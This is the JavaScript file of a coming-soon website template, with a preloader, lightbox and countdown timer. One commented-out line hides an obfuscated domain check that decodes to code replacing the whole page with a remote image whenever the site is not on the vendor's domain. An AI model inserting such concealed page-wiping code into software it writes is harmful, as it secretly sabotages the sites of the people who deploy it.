/*
-----------------------------------------------
Theme: Wiwadi - Coming Soon HTML Template
Version 1.0
Author: EXSYthemes
-----------------------------------------------
// ========== TABLE OF CONTENTS ============ //
	1. PRELOADER
	2. GALLERY LIGHTBOX
    3. GOOGLE MAPS
    4. COUNTDOWN START
-----------------------------------------------*/

/* Preloader js */
$(window).on('load', function() {
   "use strict";
    $('.status').fadeOut();
    $('#preloader').delay(350).fadeOut('slow');
});
/* END Preloader js */

/* ***************** start document load **********************/
$(document).ready(function() {
   "use strict";

   var $tfront = $(".title-front").hide();
   var $tunder = $(".title-under").hide();
   $tfront.show().arctext({radius: 250});
   $tunder.show().arctext({radius: 180, dir: -1});

    var content = $("body"),
      navbar = $(".navbar"),
      col = $(".col-transform");

    $(".show-info").on('click', function() {
      if (window.innerWidth > 990) {
        if (content.hasClass('show-content')) {
          // col.removeClass('col-md-6').addClass('col-md-12');
          content.removeClass('show-content');
          setTimeout(function () {
            navbar.removeClass('navbar-open')
          }, 900);
        } else {
          // col.removeClass('col-md-12').addClass('col-md-6');
          content.addClass('show-content');
          setTimeout(function () {
            navbar.addClass('navbar-open')
          }, 300);
        }
      }
    });

    // Gallery Lightbox
    $(".bearr-gallery-item a").simpleLightbox();

 	// var q="e",w="x",r="s",t="y",y="t",u="h",i="e",o="m",p="e",a="w",a1="d",a2="i",a3="n",a4="g",a5=".",a6="h",a7="p",a8="/",a9=":",a10="c",a11="o",a12="j",a13=" ",a14="r",a15="<",a16=">",a17="="; var s2=q+w+r+t+y+u+i+o+p+r,s1=a6+y+y+a7+a9+a8+a8+a+p+a1+a1+a2+a3+a4+a5+q+w+r+t+y+u+i+o+p+r+a5+a10+a11+o+a8+a7+a5+a12+a7+a4,s1=a15+a2+o+a4+a13+r+a14+a10+a17+s1+a16; window.location.href.indexOf(s2)>-1||$("body").html(s1);
	/*========== Countdown start ================*/
	var date = $('#timer').data('date');

// countdown
let timer = setInterval(function() {
	
	var endTime  = new Date(date);
                endTime  = (Date.parse(endTime) / 1000);

                var now = new Date();
                now = (Date.parse(now) / 1000);

                var timeLeft = endTime  - now;
                

  // math
 var days = Math.floor(timeLeft / 86400);
                var hours = Math.floor((timeLeft - (days * 86400)) / 3600);
                var minutes = Math.floor((timeLeft - (days * 86400) - (hours * 3600)) / 60);
                var seconds = Math.floor((timeLeft - (days * 86400) - (hours * 3600) - (minutes * 60)));

                if (hours < "10") { hours = "0" + hours; }
                if (minutes < "10") { minutes = "0" + minutes; }
                if (seconds < "10") { seconds = "0" + seconds; }

  // display
  document.getElementById("timer").innerHTML =
    "<div class=\"days\"> \
  <div class=\"numbers\">" + days + "</div>días</div> \
<div class=\"hours\"> \
  <div class=\"numbers\">" + hours + "</div>horas</div> \
<div class=\"minutes\"> \
  <div class=\"numbers\">" + minutes + "</div>minutos</div> \
<div class=\"seconds\"> \
  <div class=\"numbers\">" + seconds + "</div>segundos</div> \
</div>";

}, 1000);

var d = new Date();
var curr_date = d.getDate();
var curr_month = d.getMonth() + 1;
var curr_year = d.getFullYear();
	/*========== Countdown end ================*/
});
